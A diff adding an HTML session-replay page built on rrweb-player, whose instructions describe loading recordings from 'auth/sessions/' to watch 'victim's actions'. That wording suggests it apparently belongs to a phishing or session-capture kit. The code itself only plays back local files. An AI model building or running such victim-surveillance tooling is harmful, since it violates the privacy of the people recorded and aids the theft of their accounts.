@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Session Replay Viewer</title>
+    <script src="https://cdn.jsdelivr.net/npm/rrweb-player@latest/dist/index.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rrweb-player@latest/dist/style.css" />
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .info {
+            background: #e8f4f8;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 4px solid #3897f0;
+        }
+
+        .info p {
+            margin: 5px 0;
+            color: #555;
+        }
+
+        .info strong {
+            color: #333;
+        }
+
+        #file-input {
+            margin: 20px 0;
+            padding: 10px;
+            border: 2px dashed #3897f0;
+            border-radius: 5px;
+            background: #f8f9fa;
+        }
+
+        input[type="file"] {
+            padding: 10px;
+            font-size: 16px;
+        }
+
+        #player-container {
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .error {
+            background: #ffebee;
+            color: #c62828;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #c62828;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🎬 Session Replay Viewer</h1>
+
+        <div class="info">
+            <p><strong>How to use:</strong></p>
+            <p>1. Select a session JSON file from <code>auth/sessions/</code></p>
+            <p>2. Watch the complete playback of victim's actions</p>
+            <p>3. Use controls to pause, rewind, speed up, or skip</p>
+        </div>
+
+        <div id="file-input">
+            <label for="session-file"><strong>Load Session Recording:</strong></label><br><br>
+            <input type="file" id="session-file" accept=".json">
+        </div>
+
+        <div id="session-info" style="display:none;" class="info">
+            <p><strong>Session Details:</strong></p>
+            <p id="info-recorded">Recorded: -</p>
+            <p id="info-duration">Duration: -</p>
+            <p id="info-events">Events: -</p>
+        </div>
+
+        <div id="player-container"></div>
+        <div id="error-message"></div>
+    </div>
+
+    <script>
+        const fileInput = document.getElementById('session-file');
+        const playerContainer = document.getElementById('player-container');
+        const sessionInfo = document.getElementById('session-info');
+        const errorMessage = document.getElementById('error-message');
+
+        fileInput.addEventListener('change', function (e) {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function (event) {
+                try {
+                    const sessionData = JSON.parse(event.target.result);
+
+                    // Display session info
+                    document.getElementById('info-recorded').textContent =
+                        'Recorded: ' + (sessionData.recordedAt || new Date(sessionData.timestamp).toLocaleString());
+                    document.getElementById('info-duration').textContent =
+                        'Duration: ' + (sessionData.duration ? (sessionData.duration / 1000).toFixed(2) + 's' : 'Unknown');
+                    document.getElementById('info-events').textContent =
+                        'Events: ' + (sessionData.eventCount || sessionData.events.length);
+                    sessionInfo.style.display = 'block';
+
+                    // Clear previous player and errors
+                    playerContainer.innerHTML = '';
+                    errorMessage.innerHTML = '';
+
+                    // Create player
+                    new rrwebPlayer({
+                        target: playerContainer,
+                        props: {
+                            events: sessionData.events,
+                            width: 1280,
+                            height: 720,
+                            autoPlay: false,
+                            showController: true,
+                            speedOption: [0.5, 1, 2, 4, 8],
+                            tags: {}
+                        }
+                    });
+
+                } catch (error) {
+                    errorMessage.innerHTML = '<div class="error"><strong>Error:</strong> Invalid session file. ' + error.message + '</div>';
+                    sessionInfo.style.display = 'none';
+                }
+            };
+            reader.readAsText(file);
+        });
+    </script>
+</body>
+
+</html>
